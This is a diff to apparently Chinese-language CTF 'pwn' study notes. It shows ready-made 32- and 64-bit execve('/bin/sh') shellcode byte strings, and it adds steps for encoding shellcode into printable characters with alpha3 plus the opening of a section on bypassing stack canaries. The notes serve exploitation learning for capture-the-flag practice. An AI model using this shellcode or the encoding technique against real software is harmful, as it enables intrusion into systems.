@@ -18,6 +18,8 @@
 
 #### 解题脚本 
 
+##### 普通shellcode
+
 首先记录一些常用的shellcode，分别适用于32位和64位系统，更多shellcode可以访问[shellstorm](http://shell-storm.org/shellcode/)
 
 ```
@@ -29,6 +31,8 @@ shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\
 amd64，长度29字节
 shellcode = "\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
 ```
+
+##### 禁用了system的shellcode
 
 这里也放一下orw的shellcode，偶尔会遇到这种题。
 
@@ -77,6 +81,15 @@ pop eax
 int 0x80
 '''
 ```
+
+##### 限制了字符的shellcode
+
+比如说，题目对输入的shellcode进行限制，只能输入可打印字符，这个时候，可以利用`alpha3`工具来生成所需要的shellcode，生成的过程为：
+
+- 利用pwntools的shellcraft工具生成shellcode，并以字节流的形式保存在文件中
+- 利用alpha3工具，输入命令：`python ALPHA3.py x64 ascii mixedcase rax --input='shellcode' > ../temp/x64_out`这句话的意思是，平台为`x64`，输出可见字符，程序中有`call rax`语句，‘shellcode’是刚刚保存的那个文件，最后生成的内容写入到`x64_out`。需要注意：**alph3安装在python2环境中运行。**
+
+还有一些其他的利用思路，可以看这篇文章：[shellcode的艺术](https://xz.aliyun.com/t/6645#toc-4)
 
 ### 2、ROP
 
@@ -305,4 +318,15 @@ def stack_pivot_attack(io, elf, leave_ret_addr:int, fake_rbp_addr:int):
 ```
 
 #### 2.6 ret2sigreturn
+
+
+
+### 3、绕过Canary
+
+- canary可以检测出程序是否存在栈溢出
+- canary一般就在ebp指针的下方
+- canary是一个随机值，结尾一定是`\x00`
+- 所有子进程、函数的canary都是一样的
+
+#### 3.1 泄露canary
 
